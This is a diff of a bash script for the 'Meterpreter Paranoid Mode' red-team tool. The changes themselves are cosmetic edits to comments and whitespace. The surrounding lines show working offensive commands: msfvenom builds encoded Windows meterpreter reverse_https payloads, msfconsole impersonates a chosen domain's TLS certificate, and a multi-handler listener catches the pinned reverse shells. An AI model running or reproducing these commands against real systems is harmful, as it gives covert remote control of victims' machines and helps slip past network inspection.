@@ -2,6 +2,7 @@
 ##
 # Meterpreter Paranoid Mode - SSL/TLS connections
 # Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.2
+# Distros Supported : Linux Kali, Mint, Ubuntu
 # Suspicious-Shell-Activity (SSA) RedTeam dev @2017
 # ---
 #
@@ -29,7 +30,7 @@
 V3R="1.3"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
 ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
-DEFAULT_EXT="bat"                           # Default payload extension to use (bat | ps1 | txt)
+DEFAULT_EXT="bat"                           # Default payload (staged) extension (bat | ps1 | txt)
 ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload (32bits | 64bits)
 ENCODE_NUMB="3"                             # How many interactions to encode payload (0 | 9)
 # __________________________________________|
@@ -150,6 +151,7 @@ if [ "$ChEk_DB" = "ON" ]; then
 fi
 
 
+
 #
 # grab Operative System distro to store IP addr
 # output = Ubuntu OR Kali OR Parrot OR BackBox
@@ -198,7 +200,7 @@ read OP
 
 
 #
-# Chose payload categorie to be used (staged/stageless) ..
+# Build PEM certificate (manual or impersonate)
 #
 cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 160) > /dev/null 2>&1
 if [ "$cHos" = "manual certificate" ]; then
@@ -223,7 +225,7 @@ elif [ "$cHos" = "impersonate domain" ]; then
   # Copy files generated to proper location and cleanup ..
   #
   echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
-  N4M3=$(zenity --title="☠ Enter  DOMAIN NAME ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
+  N4M3=$(zenity --title="☠ Enter DOMAIN NAME (CN) ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Impersonating certificate ..${BlueF};
   xterm -T "MPM - IMPERSONATE CERTIFICATE" -geometry 121x26 -e "msfconsole -q -x 'use auxiliary/gather/impersonate_ssl; set RHOST $N4M3; exploit; sleep 3; exit -y'"
   echo "Impersonating $N4M3 RSA private key"
@@ -276,6 +278,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
     sleep 1
     exit
   fi
+
     #
     # Create a Paranoid Payload (staged payload)
     # For this use case, we will combine Payload UUID tracking with TLS pinning.
@@ -312,7 +315,6 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
 
 
 
-
   # 
   # Create the staged Paranoid Listener (multi-handler)
   #
@@ -322,6 +324,7 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; exploit'"
   echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
   sleep 2
+
 
 
 #
@@ -340,7 +343,6 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
     paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" FALSE "windows/meterpreter_reverse_http" --width 350 --height 220) > /dev/null 2>&1
     msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f exe -o paranoid-stageless.exe
     sleep 2
-
 
   #
   # Create a stageless Paranoid Listener (multi-handler)..
@@ -375,9 +377,3 @@ service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT �
 fi
 sleep 1
 exit
-
-
-
-
-
-
